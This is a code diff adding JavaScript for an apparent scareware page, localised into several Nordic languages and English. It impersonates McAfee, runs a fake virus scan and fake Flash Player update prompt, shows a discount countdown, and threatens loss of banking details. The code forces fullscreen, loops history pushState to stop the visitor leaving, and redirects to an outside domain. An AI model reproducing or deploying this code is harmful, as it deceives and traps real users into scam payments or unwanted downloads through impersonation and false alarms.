+            clearInterval(counterInterval);
+        }
+    }, interval);
+}
+
+// Total item scanned counter
+function animateTotalScannedCount(startCount, endCount, animationDuration) {
+    var interval = 50; // Update every 50 milliseconds
+    var currentCount = startCount;
+    var increment = (endCount - startCount) / (animationDuration / interval);
+    var counterInterval = setInterval(function() {
+        currentCount += increment;
+        document.getElementById('totalScannedCount').textContent = Math.floor(Math.min(currentCount, endCount));
+        if (currentCount >= endCount) {
+            clearInterval(counterInterval);
+        }
+    }, interval);
+}
+
+// Display scan item
+function scanPaths(paths, delay, stopTime) {
+    var currentIndex = 0;
+    var intervalId = setInterval(function() {
+        document.getElementById('scanPathes').textContent = paths[currentIndex];
+        currentIndex = (currentIndex + 1) % paths.length; // Increment index and loop back to 0 if it reaches the end
+    }, delay);
+
+    setTimeout(function() {
+        clearInterval(intervalId);
+        document.getElementById('scanPathes').textContent = paths[0]; // Display the final text after 7 seconds
+    }, stopTime);
+}
+
+var paths = ["C:\\Windows\\System32\\DriverState", "C:\\Program Files\\Doughnut preferences\\With jam in.", "C:\\Program Files\\PuppetLabs."];
+
+// Countdown timer
+function countdown() {
+    var mins = parseInt(document.getElementById("mins").textContent);
+    var secs = parseInt(document.getElementById("secs").textContent);
+
+    if (secs > 0)
+        secs--;
+
+    if (secs < 10)
+        secs = "0" + secs;
+
+    document.getElementById("secs").textContent = secs;
+
+    if (secs == "00") {
+        if (mins != "00") {
+            document.getElementById("secs").textContent = "59";
+
+            if (mins > 0)
+                mins--;
+
+            document.getElementById("mins").textContent = mins < 10 ? "0" + mins : mins;
+        }
+    }
+}
+
+	
+//full screen function
+		document.fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+		function requestFullscreen(element) {
+			if (element.requestFullscreen) {
+				element.requestFullscreen();
+			} else if (element.mozRequestFullScreen) {
+				element.mozRequestFullScreen();
+			} else if (element.webkitRequestFullScreen) {
+				element.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+			}
+		}
+
+
+
+
+
+//Outbound link: 
+var url_parameter = getURLParameter("domain");
+function out(){window.onbeforeunload=null,window.location="https://bin.surpriseanddelightgifts.com/cool.php?lp=1"}
+
+
+//BB-keep current page
+! function () {
+var t;
+try {
+for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+onpopstate = function (t) {
+t.state && location.replace("#")
+}
+} catch (o) {}
+}();
+
+//address bar script  	
+	setTimeout(function(){  
+		window.history.pushState('/', 'Other Page', '/');
+		window.history.pushState('/', 'Initial Page', '/');
+		 }, 3000); 
+
+
+		 window.addEventListener("popstate", function(e) {
+			if(document.URL.indexOf("/") >= 0){
+				document.location.href = document.location;
+			}
+		 });
+
+
+
+//language translation code
+		var getUrlParameter = function getUrlParameter(sParam) {
+			var sPageURL = window.location.search.substring(1),
+				sURLVariables = sPageURL.split('&'),
+				sParameterName,
+				i;
+
+			for (i = 0; i < sURLVariables.length; i++) {
+				sParameterName = sURLVariables[i].split('=');
+
+				var key = decodeURIComponent(sParameterName[0]);
+				var value = decodeURIComponent(sParameterName[1]);
+
+				if (key === sParam) {
+					return value === undefined ? true : value;
+				}
+			}
+		};
+		if (getUrlParameter('language')) {
+			var lang = getUrlParameter('language').toLowerCase().split('-',1);
+		}
+
+
+
+
+
+// English
+if (lang == 'en') {
+document.getElementById('modal_f01').innerHTML = "Software Update";
+document.getElementById('modal_f03').innerHTML = "Update your <span> Flash Player</span>";
+document.getElementById('modal_f04').innerHTML = "Install the latest Flash Player for better performance.";
+document.getElementById('btnUpdateNow').innerHTML = "Update now";
+document.getElementById('modal_f05').innerHTML = "\"Flash Player\" is an essential plugin for your browser that allows you to view everything from video to games and animation on the web.<br><br>To continue using \"Flash Player\", download an updated version.";
+document.getElementById('modal_f06').innerHTML = "Click \"Download Flash\"";
+document.getElementById('modal_f07').innerHTML = "Install updates and enjoy performance";
+
+document.getElementById('closeBtn').innerHTML = "Download Flash Player";
+document.getElementById('alrt_updated_btn').innerHTML = "Update";
+
+
+
+document.getElementById('w1_001').innerHTML = "Security Warning - Potential Virus Infection";
+document.getElementById('w1_003').innerHTML = "You may have visited unsafe websites with malicious content";
+document.getElementById('w1_004').innerHTML = "Your PC is at risk of being infected by viruses";
+document.getElementById('w1_005').innerHTML = "To continue browsing safely - perform an antivirus scan";
+document.getElementById('w1_006').innerHTML = "Run Quick Scan ";	
+
+document.getElementById('w1_3').innerHTML = 'You are protected';
+document.getElementById('w1_4').innerHTML = 'Protection Updates:';
+document.getElementById('w1_5').innerHTML = 'Current';
+document.getElementById('w1_6').innerHTML = 'Last Scan:';
+document.getElementById('w1_7').innerHTML = 'Not available';
+document.getElementById('w1_8').innerHTML = 'Run Quick Scan';
+document.getElementById('w1_9').innerHTML = 'License Used:';
+document.getElementById('w1_10').innerHTML = '1 of 5';
+document.getElementById('w1_11').innerHTML = 'Install on Another Device';
+document.getElementById('w1_12').innerHTML = 'System';
+document.getElementById('w1_13').innerHTML = 'Protected';
+document.getElementById('w1_14').innerHTML = 'Browsers';
+document.getElementById('w1_13a').innerHTML = 'Protected';
+document.getElementById('w1_15').innerHTML = 'Performance';
+document.getElementById('w1_15a').innerHTML = 'Cloud';
+document.getElementById('w1_15b').innerHTML = 'Files';
+document.getElementById('w1_13d').innerHTML = 'Documents';
+document.getElementById('w1_13b').innerHTML = 'Protected';
+document.getElementById('w1_16').innerHTML = 'More McAfee';
+document.getElementById('w1_16a').innerHTML = 'Visit Website';
+document.getElementById('w1_13c').innerHTML = 'Protected';
+document.getElementById('w1_17').innerHTML = 'Subscription Status:';
+document.getElementById('w1_18').innerHTML = '30 Days Remaining';
+
+document.getElementById('w2_1').innerHTML = 'Quick Scan';
+document.getElementById('w2_2').innerHTML = 'Scanning...';
+document.getElementById('w2_2b').innerHTML = 'Viruses and Malware';
+document.getElementById('w2_3').innerHTML = 'Scanning commonly infected areas and startup files...';
+document.getElementById('w2_6').innerHTML = 'Scan Results';
+document.getElementById('w2_7').innerHTML = '[+] Total Items Scanned:';
+document.getElementById('w2_8').innerHTML = '[+] Total Security Risks Detected:';
+document.getElementById('w2_9').innerHTML = '[+] Total Security Risks Resolved:';
+document.getElementById('w2_9b').innerHTML = 'Result Summary';
+document.getElementById('w2_11').innerHTML = 'Pause';
+document.getElementById('w2_12').innerHTML = 'Stop';
+	
+document.getElementById('w3_1').innerHTML = 'Your computer is infected with (5) viruses!';
+document.getElementById('w3_2').innerHTML = 'Update now to protect your PC.';
+document.getElementById('w3_3').innerHTML = 'Without protection, your PC is vulnerable to viruses and other malware threats.';
+document.getElementById('w3_6').innerHTML = 'Continue…';	
+					
+document.getElementById('w5_001').innerHTML = 'In Progress: Please do not close';
+document.getElementById('w5_001a').innerHTML = 'Repair in Progress...';
+document.getElementById('w5_002').innerHTML = 'Selecting infected areas and files...';
+document.getElementById('w5_003').innerHTML = 'Selected areas and files isolated...';
+document.getElementById('w5_004').innerHTML = 'Checking system permissions';
+document.getElementById('w5_005').innerHTML = 'Checking system status...';
+document.getElementById('w5_006').innerHTML = 'Checking McAfee subscription status...';
+document.getElementById('w5_007').innerHTML = 'Pause';
+document.getElementById('w5_008').innerHTML = 'Stop';			
+			
+document.getElementById('w6_000').innerHTML = 'Warning! Your antivirus protection is not activated!';
+document.getElementById('w6_001').innerHTML = 'Viruses identified:';
+document.getElementById('w6_003').innerHTML = 'Your Antivirus Protection Has Expired<br> On';
+document.getElementById('w6_004').innerHTML = 'Given that your computer is potentially infected with (7) different viruses, renewing your antivirus software is essential for protecting your personal information, preventing further damage, and restoring your system\'s integrity and security. Ignoring Renewal Of Antivirus Will Result in Losing Banking Details, Personal Information and Other Valuable Information From Your Computer. ';	
+document.getElementById('w6_005').innerHTML = 'Without protection, your computer is at risk of viruses and other malware.';
+document.getElementById('w6_006').innerHTML = '55% Discount!';
+document.getElementById('w6_007').innerHTML = 'Offer Expires In:';
+document.getElementById('w6_008').innerHTML = 'Minutes';
+document.getElementById('w6_009').innerHTML = 'Seconds';
+document.getElementById('w6_010').innerHTML = 'Renew Now';
+
+document.getElementById('risk').innerHTML = 'Risk';
+document.getElementById('high').innerHTML = 'High';
+document.getElementById('origin').innerHTML = 'Source';
+document.getElementById('notavl').innerHTML = 'Unavailable';
+document.getElementById('actvty').innerHTML = 'Activity';
+document.getElementById('thretaction').innerHTML = 'Threat Actions Executed: 1';
+document.getElementById('risk2').innerHTML = 'Risk';
+document.getElementById('high2').innerHTML = 'High';
+document.getElementById('origin2').innerHTML = 'Source';
+document.getElementById('notavl2').innerHTML = 'Unavailable';
+document.getElementById('actvty2').innerHTML = 'Activity';
+document.getElementById('thretaction2').innerHTML = 'Threat Actions Executed: 1';
+document.getElementById('risk3').innerHTML = 'Risk';
+document.getElementById('high3').innerHTML = 'High';
+document.getElementById('origin3').innerHTML = 'Source';
+document.getElementById('notavl3').innerHTML = 'Unavailable';
+document.getElementById('actvty3').innerHTML = 'Activity';
+document.getElementById('thretaction3').innerHTML = 'Threat Actions Executed: 1';
+}
+
+
+//Swedish(se)
+if (lang == 'se') {
+document.getElementById('w1_001').innerHTML = "Säkerhetsvarning - Potentiell virusinfektion";
+document.getElementById('w1_003').innerHTML = "Du kan ha besökt osäkra webbplatser med skadligt innehåll";
+document.getElementById('w1_004').innerHTML = "Din dator löper risk att bli infekterad av virus";
+document.getElementById('w1_005').innerHTML = "För att fortsätta surfa säkert - utför en antivirus-skanning";
+document.getElementById('w1_006').innerHTML = "Kör snabb skanning";
+
+//document.getElementById('w1_1').innerHTML = 'Inställningar';
+//document.getElementById('w1_2').innerHTML = 'Hjälp';
+document.getElementById('w1_3').innerHTML = 'Du är skyddad';
+document.getElementById('w1_4').innerHTML = 'Skyddsuppdateringar:';
+document.getElementById('w1_5').innerHTML = 'Nuvarande';
+document.getElementById('w1_6').innerHTML = 'Senaste skanning:';
+document.getElementById('w1_7').innerHTML = 'Inte tillgänglig';
+document.getElementById('w1_8').innerHTML = 'Kör snabb skanning';
+document.getElementById('w1_9').innerHTML = 'Licens använd:';
+document.getElementById('w1_10').innerHTML = '1 av 5';
+document.getElementById('w1_11').innerHTML = 'Installera på en annan enhet';
+document.getElementById('w1_12').innerHTML = 'System';
+document.getElementById('w1_13').innerHTML = 'Skyddad';
+document.getElementById('w1_14').innerHTML = 'Webbläsare';
+document.getElementById('w1_13a').innerHTML = 'Skyddad';
+document.getElementById('w1_15').innerHTML = 'Prestanda';
+document.getElementById('w1_15a').innerHTML = 'Moln';
+document.getElementById('w1_15b').innerHTML = 'Filer';
+document.getElementById('w1_13d').innerHTML = 'Dokument';
+document.getElementById('w1_13b').innerHTML = 'Skyddad';
+document.getElementById('w1_16').innerHTML = 'Mer McAfee';
+document.getElementById('w1_16a').innerHTML = 'Besök webbplatsen';
+document.getElementById('w1_13c').innerHTML = 'Skyddad';
+document.getElementById('w1_17').innerHTML = 'Prenumerationsstatus:';
+document.getElementById('w1_18').innerHTML = '30 dagar kvar';
+
+document.getElementById('w2_1').innerHTML = 'Snabb skanning';
+document.getElementById('w2_2').innerHTML = 'Skannar…';
+document.getElementById('w2_2b').innerHTML = 'Virus och skadlig kod';
+document.getElementById('w2_3').innerHTML = 'Skannar vanligtvis infekterade områden och startfiler…';
+document.getElementById('w2_6').innerHTML = 'Skanningsresultat';
+document.getElementById('w2_7').innerHTML = '[+] Totalt antal skannade objekt:';
+document.getElementById('w2_8').innerHTML = '[+] Totalt antal upptäckta säkerhetsrisker:';
+document.getElementById('w2_9').innerHTML = '[+] Totalt antal lösta säkerhetsrisker:';
+document.getElementById('w2_9b').innerHTML = 'Sammanfattning av resultat';
+document.getElementById('w2_11').innerHTML = 'Paus';
+document.getElementById('w2_12').innerHTML = 'Stopp';
+
+document.getElementById('w3_1').innerHTML = 'Din dator är infekterad med (5) virus!';
+document.getElementById('w3_2').innerHTML = 'Uppdatera nu för att skydda din dator.';
+document.getElementById('w3_3').innerHTML = 'Utan skydd är din dator sårbar för virus och andra skadliga programhot.';
+document.getElementById('w3_6').innerHTML = 'Fortsätt…';
+
+document.getElementById('w5_001').innerHTML = 'Pågår: Stäng inte av';
+document.getElementById('w5_001a').innerHTML = 'Reparation pågår…';
+document.getElementById('w5_002').innerHTML = 'Väljer infekterade områden och filer…';
+document.getElementById('w5_003').innerHTML = 'Valda områden och filer isolerade…';
+document.getElementById('w5_004').innerHTML = 'Kontrollerar systembehörigheter';
+document.getElementById('w5_005').innerHTML = 'Kontrollerar systemstatus…';
+document.getElementById('w5_006').innerHTML = 'Kontrollerar McAfee-prenumerationsstatus…';
+document.getElementById('w5_007').innerHTML = 'Paus';
+document.getElementById('w5_008').innerHTML = 'Stopp';
+
+document.getElementById('w6_000').innerHTML = 'Varning! Din antivirusprogramvara är inte aktiverad!';
+document.getElementById('w6_001').innerHTML = 'Virus identifierade:';
+document.getElementById('w6_003').innerHTML = 'Ditt antivirus skydd har gått ut<br> Den';
+document.getElementById('w6_004').innerHTML = 'Med tanke på att din dator potentiellt är infekterad med (7) olika virus, är det viktigt att förnya ditt antivirusprogram för att skydda din personliga information, förhindra ytterligare skada och återställa systemets integritet och säkerhet. Att ignorera förnyelse av antivirus kommer att resultera i att bankuppgifter, personlig information och annan värdefull information från din dator förloras.';
+document.getElementById('w6_005').innerHTML = 'Utan skydd är din dator i riskzonen för virus och annan skadlig programvara.';
+document.getElementById('w6_006').innerHTML = '55% rabatt!';
+document.getElementById('w6_007').innerHTML = 'Erbjudandet går ut om:';
+document.getElementById('w6_008').innerHTML = 'Minuter';
+document.getElementById('w6_009').innerHTML = 'Sekunder';
+document.getElementById('w6_010').innerHTML = 'Förnya nu';
+
+document.getElementById('risk').innerHTML = 'Risk';
+document.getElementById('high').innerHTML = 'Hög';
+document.getElementById('origin').innerHTML = 'Källa';
+document.getElementById('notavl').innerHTML = 'Ej tillgänglig';
+document.getElementById('actvty').innerHTML = 'Aktivitet';
+document.getElementById('thretaction').innerHTML = 'Hotåtgärder utförda: 1';
+document.getElementById('risk2').innerHTML = 'Risk';
+document.getElementById('high2').innerHTML = 'Hög';
+document.getElementById('origin2').innerHTML = 'Källa';
+document.getElementById('notavl2').innerHTML = 'Ej tillgänglig';
+document.getElementById('actvty2').innerHTML = 'Aktivitet';
+document.getElementById('thretaction2').innerHTML = 'Hotåtgärder utförda: 1';
+document.getElementById('risk3').innerHTML = 'Risk';
+document.getElementById('high3').innerHTML = 'Hög';
+document.getElementById('origin3').innerHTML = 'Källa';
+document.getElementById('notavl3').innerHTML = 'Ej tillgänglig';
+document.getElementById('actvty3').innerHTML = 'Aktivitet';
+document.getElementById('thretaction3').innerHTML = 'Hotåtgärder utförda: 1';
+}
+
+//finnish(fi)
+if (lang == 'fi') {
+document.getElementById('w1_001').innerHTML = "Turvallisuusvaroitus - Mahdollinen virustartunta";
+document.getElementById('w1_003').innerHTML = "Saatoit käydä epävarmoilla verkkosivustoilla, joilla on haitallista sisältöä";
+document.getElementById('w1_004').innerHTML = "Tietokoneesi on vaarassa saada viruksia";
+document.getElementById('w1_005').innerHTML = "Jatkaaksesi selaamista turvallisesti - suorita virustarkistus";
+document.getElementById('w1_006').innerHTML = "Suorita pikatarkistus";
+
+//document.getElementById('w1_1').innerHTML = 'Asetukset';
+//document.getElementById('w1_2').innerHTML = 'Ohje';
+document.getElementById('w1_3').innerHTML = 'Olet suojattu';
+document.getElementById('w1_4').innerHTML = 'Suojapäivitykset:';
+document.getElementById('w1_5').innerHTML = 'Nykyinen';
+document.getElementById('w1_6').innerHTML = 'Viimeisin tarkistus:';
+document.getElementById('w1_7').innerHTML = 'Ei saatavilla';
+document.getElementById('w1_8').innerHTML = 'Suorita pikatarkistus';
+document.getElementById('w1_9').innerHTML = 'Käytetty lisenssi:';
+document.getElementById('w1_10').innerHTML = '1/5';
+document.getElementById('w1_11').innerHTML = 'Asenna toiseen laitteeseen';
+document.getElementById('w1_12').innerHTML = 'Järjestelmä';
+document.getElementById('w1_13').innerHTML = 'Suojattu';
+document.getElementById('w1_14').innerHTML = 'Selaimet';
+document.getElementById('w1_13a').innerHTML = 'Suojattu';
+document.getElementById('w1_15').innerHTML = 'Suorituskyky';
+document.getElementById('w1_15a').innerHTML = 'Pilvi';
+document.getElementById('w1_15b').innerHTML = 'Tiedostot';
+document.getElementById('w1_13d').innerHTML = 'Asiakirjat';
+document.getElementById('w1_13b').innerHTML = 'Suojattu';
+document.getElementById('w1_16').innerHTML = 'Lisää McAfee';
+document.getElementById('w1_16a').innerHTML = 'Vieraile verkkosivustolla';
+document.getElementById('w1_13c').innerHTML = 'Suojattu';
+document.getElementById('w1_17').innerHTML = 'Tilausstatus:';
+document.getElementById('w1_18').innerHTML = '30 päivää jäljellä';
+
+document.getElementById('w2_1').innerHTML = 'Pikatarkistus';
+document.getElementById('w2_2').innerHTML = 'Skannataan...';
+document.getElementById('w2_2b').innerHTML = 'Virukset ja haittaohjelmat';
+document.getElementById('w2_3').innerHTML = 'Skannataan yleisesti tartunnan saaneet alueet ja käynnistystiedostot...';
+document.getElementById('w2_6').innerHTML = 'Tarkistustulokset';
+document.getElementById('w2_7').innerHTML = '[+] Skannatut kohteet yhteensä:';
+document.getElementById('w2_8').innerHTML = '[+] Havaitut turvallisuusriskit yhteensä:';
+document.getElementById('w2_9').innerHTML = '[+] Ratkaistut turvallisuusriskit yhteensä:';
+document.getElementById('w2_9b').innerHTML = 'Tulosselvitys';
+document.getElementById('w2_11').innerHTML = 'Keskeytä';
+document.getElementById('w2_12').innerHTML = 'Lopeta';
+
+document.getElementById('w3_1').innerHTML = 'Tietokoneesi on saanut tartunnan (5) viruksella!';
+document.getElementById('w3_2').innerHTML = 'Päivitä nyt suojataksesi tietokoneesi.';
+document.getElementById('w3_3').innerHTML = 'Ilman suojaa tietokoneesi on alttiina viruksille ja muille haittaohjelmille.';
+document.getElementById('w3_6').innerHTML = 'Jatka...';
+
+document.getElementById('w5_001').innerHTML = 'Käynnissä: Älä sulje';
+document.getElementById('w5_001a').innerHTML = 'Korjaus käynnissä...';
+document.getElementById('w5_002').innerHTML = 'Valitaan tartunnan saaneet alueet ja tiedostot...';
+document.getElementById('w5_003').innerHTML = 'Valitut alueet ja tiedostot eristetty...';
+document.getElementById('w5_004').innerHTML = 'Tarkistetaan järjestelmän käyttöoikeudet';
+document.getElementById('w5_005').innerHTML = 'Tarkistetaan järjestelmän tilaa...';
+document.getElementById('w5_006').innerHTML = 'Tarkistetaan McAfee-tilauksen tilaa...';
+document.getElementById('w5_007').innerHTML = 'Keskeytä';
+document.getElementById('w5_008').innerHTML = 'Lopeta';
+
+document.getElementById('w6_000').innerHTML = 'Varoitus! Antivirus-suojauksesi ei ole aktivoitu!';
+document.getElementById('w6_001').innerHTML = 'Tunnistetut virukset:';
+document.getElementById('w6_003').innerHTML = 'Antivirus-suojauksesi on vanhentunut<br> Päiväys';
+document.getElementById('w6_004').innerHTML = 'Koska tietokoneesi on mahdollisesti saanut (7) eri virusta, on tärkeää uusia virustorjuntaohjelmistosi suojataksesi henkilökohtaiset tietosi, estääksesi lisävahinkoja ja palauttaaksesi järjestelmäsi eheyden ja turvallisuuden. Virustorjunnan uusimisen laiminlyönti johtaa pankkitietojen, henkilökohtaisten tietojen ja muun arvokkaan tiedon menettämiseen tietokoneeltasi.';
+document.getElementById('w6_005').innerHTML = 'Ilman suojaa tietokoneesi on alttiina viruksille ja muille haittaohjelmille.';
+document.getElementById('w6_006').innerHTML = '55% Alennus!';
+document.getElementById('w6_007').innerHTML = 'Tarjous päättyy:';
+document.getElementById('w6_008').innerHTML = 'Minuutit';
+document.getElementById('w6_009').innerHTML = 'Sekunnit';
+document.getElementById('w6_010').innerHTML = 'Uusi nyt';
+
+document.getElementById('risk').innerHTML = 'Riski';
+document.getElementById('high').innerHTML = 'Korkea';
+document.getElementById('origin').innerHTML = 'Lähde';
+document.getElementById('notavl').innerHTML = 'Ei saatavilla';
+document.getElementById('actvty').innerHTML = 'Toiminta';
+document.getElementById('thretaction').innerHTML = 'Uhkaan liittyvät toimet suoritettu: 1';
+document.getElementById('risk2').innerHTML = 'Riski';
+document.getElementById('high2').innerHTML = 'Korkea';
+document.getElementById('origin2').innerHTML = 'Lähde';
+document.getElementById('notavl2').innerHTML = 'Ei saatavilla';
+document.getElementById('actvty2').innerHTML = 'Toiminta';
+document.getElementById('thretaction2').innerHTML = 'Uhkaan liittyvät toimet suoritettu: 1';
+document.getElementById('risk3').innerHTML = 'Riski';
+document.getElementById('high3').innerHTML = 'Korkea';
+document.getElementById('origin3').innerHTML = 'Lähde';
+document.getElementById('notavl3').innerHTML = 'Ei saatavilla';
+document.getElementById('actvty3').innerHTML = 'Toiminta';
+document.getElementById('thretaction3').innerHTML = 'Uhkaan liittyvät toimet suoritettu: 1';
+}
+
+//Norwegian(no)
+if (lang == 'no') {
+document.getElementById('w1_001').innerHTML = "Sikkerhetsadvarsel - Potensiell virusinfeksjon";
+document.getElementById('w1_003').innerHTML = "Du kan ha besøkt usikre nettsteder med skadelig innhold";
+document.getElementById('w1_004').innerHTML = "Din PC er i fare for å bli infisert av virus";
+document.getElementById('w1_005').innerHTML = "For å fortsette å surfe trygt - utfør en antivirus-skanning";
+document.getElementById('w1_006').innerHTML = "Kjør rask skanning";
+
+//document.getElementById('w1_1').innerHTML = 'Innstillinger';
+//document.getElementById('w1_2').innerHTML = 'Hjelp';
+document.getElementById('w1_3').innerHTML = 'Du er beskyttet';
+document.getElementById('w1_4').innerHTML = 'Beskyttelsesoppdateringer:';
+document.getElementById('w1_5').innerHTML = 'Nåværende';
+document.getElementById('w1_6').innerHTML = 'Siste skanning:';
+document.getElementById('w1_7').innerHTML = 'Ikke tilgjengelig';
+document.getElementById('w1_8').innerHTML = 'Kjør rask skanning';
+document.getElementById('w1_9').innerHTML = 'Lisens brukt:';
+document.getElementById('w1_10').innerHTML = '1 av 5';
+document.getElementById('w1_11').innerHTML = 'Installer på en annen enhet';
+document.getElementById('w1_12').innerHTML = 'System';
+document.getElementById('w1_13').innerHTML = 'Beskyttet';
+document.getElementById('w1_14').innerHTML = 'Nettlesere';
+document.getElementById('w1_13a').innerHTML = 'Beskyttet';
+document.getElementById('w1_15').innerHTML = 'Ytelse';
+document.getElementById('w1_15a').innerHTML = 'Sky';
+document.getElementById('w1_15b').innerHTML = 'Filer';
+document.getElementById('w1_13d').innerHTML = 'Dokumenter';
+document.getElementById('w1_13b').innerHTML = 'Beskyttet';
+document.getElementById('w1_16').innerHTML = 'Mer McAfee';
+document.getElementById('w1_16a').innerHTML = 'Besøk nettstedet';
+document.getElementById('w1_13c').innerHTML = 'Beskyttet';
+document.getElementById('w1_17').innerHTML = 'Abonnementsstatus:';
+document.getElementById('w1_18').innerHTML = '30 dager igjen';
+
+document.getElementById('w2_1').innerHTML = 'Rask skanning';
+document.getElementById('w2_2').innerHTML = 'Skanning...';
+document.getElementById('w2_2b').innerHTML = 'Virus og skadelig programvare';
+document.getElementById('w2_3').innerHTML = 'Skanner vanligvis infiserte områder og oppstartsfiler...';
+document.getElementById('w2_6').innerHTML = 'Skanningsresultater';
+document.getElementById('w2_7').innerHTML = '[+] Totalt skannede elementer:';
+document.getElementById('w2_8').innerHTML = '[+] Totalt oppdagede sikkerhetsrisikoer:';
+document.getElementById('w2_9').innerHTML = '[+] Totalt løste sikkerhetsrisikoer:';
+document.getElementById('w2_9b').innerHTML = 'Oppsummering av resultater';
+document.getElementById('w2_11').innerHTML = 'Pause';
+document.getElementById('w2_12').innerHTML = 'Stopp';
+
+document.getElementById('w3_1').innerHTML = 'Din datamaskin er infisert med (5) virus!';
+document.getElementById('w3_2').innerHTML = 'Oppdater nå for å beskytte din PC.';
+document.getElementById('w3_3').innerHTML = 'Uten beskyttelse er din PC sårbar for virus og andre malware-trusler.';
+document.getElementById('w3_6').innerHTML = 'Fortsett…';
+
+document.getElementById('w5_001').innerHTML = 'Pågår: Vennligst ikke lukk';
+document.getElementById('w5_001a').innerHTML = 'Reparasjon pågår...';
+document.getElementById('w5_002').innerHTML = 'Velger infiserte områder og filer...';
+document.getElementById('w5_003').innerHTML = 'Valgte områder og filer isolert...';
+document.getElementById('w5_004').innerHTML = 'Sjekker systemtillatelser';
+document.getElementById('w5_005').innerHTML = 'Sjekker systemstatus...';
+document.getElementById('w5_006').innerHTML = 'Sjekker McAfee-abonnementsstatus...';
+document.getElementById('w5_007').innerHTML = 'Pause';
+document.getElementById('w5_008').innerHTML = 'Stopp';
+
+document.getElementById('w6_000').innerHTML = 'Advarsel! Din antivirusbeskyttelse er ikke aktivert!';
+document.getElementById('w6_001').innerHTML = 'Identifiserte virus:';
+document.getElementById('w6_003').innerHTML = 'Din antivirusbeskyttelse har utløpt<br> den';
+document.getElementById('w6_004').innerHTML = 'Gitt at datamaskinen din potensielt er infisert med (7) forskjellige virus, er det viktig å fornye antivirusprogramvaren for å beskytte din personlige informasjon, forhindre ytterligere skade og gjenopprette systemets integritet og sikkerhet. Å ignorere fornyelsen av antivirusprogrammet vil resultere i tap av bankdetaljer, personlig informasjon og annen verdifull informasjon fra datamaskinen din.';
+document.getElementById('w6_005').innerHTML = 'Uten beskyttelse er din datamaskin i fare for virus og andre malware.';
+document.getElementById('w6_006').innerHTML = '55% Rabatt!';
+document.getElementById('w6_007').innerHTML = 'Tilbudet utløper om:';
+document.getElementById('w6_008').innerHTML = 'Minutter';
+document.getElementById('w6_009').innerHTML = 'Sekunder';
+document.getElementById('w6_010').innerHTML = 'Forny nå';
+
+document.getElementById('risk').innerHTML = 'Risiko';
+document.getElementById('high').innerHTML = 'Høy';
+document.getElementById('origin').innerHTML = 'Kilde';
+document.getElementById('notavl').innerHTML = 'Utilgjengelig';
+document.getElementById('actvty').innerHTML = 'Aktivitet';
+document.getElementById('thretaction').innerHTML = 'Trusselhandlinger utført: 1';
+document.getElementById('risk2').innerHTML = 'Risiko';
+document.getElementById('high2').innerHTML = 'Høy';
+document.getElementById('origin2').innerHTML = 'Kilde';
+document.getElementById('notavl2').innerHTML = 'Utilgjengelig';
+document.getElementById('actvty2').innerHTML = 'Aktivitet';
+document.getElementById('thretaction2').innerHTML = 'Trusselhandlinger utført: 1';
+document.getElementById('risk3').innerHTML = 'Risiko';
+document.getElementById('high3').innerHTML = 'Høy';
+document.getElementById('origin3').innerHTML = 'Kilde';
+document.getElementById('notavl3').innerHTML = 'Utilgjengelig';
+document.getElementById('actvty3').innerHTML = 'Aktivitet';
+document.getElementById('thretaction3').innerHTML = 'Trusselhandlinger utført: 1';
+
+}
+
+//Danish(dk)
+if (lang == 'dk') {
+document.getElementById('w1_001').innerHTML = "Sikkerhedsadvarsel - Potentiel virusinfektion";
+document.getElementById('w1_003').innerHTML = "Du kan have besøgt usikre websteder med ondsindet indhold";
+document.getElementById('w1_004').innerHTML = "Din PC er i fare for at blive inficeret af vira";
+document.getElementById('w1_005').innerHTML = "For at fortsætte med at browse sikkert - udfør en antivirus scanning";
+document.getElementById('w1_006').innerHTML = "Kør hurtig scanning";
+
+//document.getElementById('w1_1').innerHTML = 'Indstillinger';
+//document.getElementById('w1_2').innerHTML = 'Hjælp';
+document.getElementById('w1_3').innerHTML = 'Du er beskyttet';
+document.getElementById('w1_4').innerHTML = 'Beskyttelsesopdateringer:';
+document.getElementById('w1_5').innerHTML = 'Aktuel';
+document.getElementById('w1_6').innerHTML = 'Seneste scanning:';
+document.getElementById('w1_7').innerHTML = 'Ikke tilgængelig';
+document.getElementById('w1_8').innerHTML = 'Kør hurtig scanning';
+document.getElementById('w1_9').innerHTML = 'Brugt licens:';
+document.getElementById('w1_10').innerHTML = '1 af 5';
+document.getElementById('w1_11').innerHTML = 'Installer på en anden enhed';
+document.getElementById('w1_12').innerHTML = 'System';
+document.getElementById('w1_13').innerHTML = 'Beskyttet';
+document.getElementById('w1_14').innerHTML = 'Browsere';
+document.getElementById('w1_13a').innerHTML = 'Beskyttet';
+document.getElementById('w1_15').innerHTML = 'Ydeevne';
+document.getElementById('w1_15a').innerHTML = 'Sky';
+document.getElementById('w1_15b').innerHTML = 'Filer';
+document.getElementById('w1_13d').innerHTML = 'Dokumenter';
+document.getElementById('w1_13b').innerHTML = 'Beskyttet';
+document.getElementById('w1_16').innerHTML = 'Mere McAfee';
+document.getElementById('w1_16a').innerHTML = 'Besøg hjemmeside';
+document.getElementById('w1_13c').innerHTML = 'Beskyttet';
+document.getElementById('w1_17').innerHTML = 'Abonnementsstatus:';
+document.getElementById('w1_18').innerHTML = '30 dage tilbage';
+
+document.getElementById('w2_1').innerHTML = 'Hurtig scanning';
+document.getElementById('w2_2').innerHTML = 'Skanning...';
+document.getElementById('w2_2b').innerHTML = 'Vira og malware';
+document.getElementById('w2_3').innerHTML = 'Skanning af almindeligt inficerede områder og opstartsfiler...';
+document.getElementById('w2_6').innerHTML = 'Skanningsresultater';
+document.getElementById('w2_7').innerHTML = '[+] Samlede elementer scannet:';
+document.getElementById('w2_8').innerHTML = '[+] Samlede sikkerhedsrisici fundet:';
+document.getElementById('w2_9').innerHTML = '[+] Samlede sikkerhedsrisici løst:';
+document.getElementById('w2_9b').innerHTML = 'Resultatresume';
+document.getElementById('w2_11').innerHTML = 'Pause';
+document.getElementById('w2_12').innerHTML = 'Stop';
+
+document.getElementById('w3_1').innerHTML = 'Din computer er inficeret med (5) vira!';
+document.getElementById('w3_2').innerHTML = 'Opdater nu for at beskytte din PC.';
+document.getElementById('w3_3').innerHTML = 'Uden beskyttelse er din PC sårbar over for vira og andre malware-trusler.';
+document.getElementById('w3_6').innerHTML = 'Fortsæt…';
+
+document.getElementById('w5_001').innerHTML = 'I gang: Luk venligst ikke';
+document.getElementById('w5_001a').innerHTML = 'Reparation i gang...';
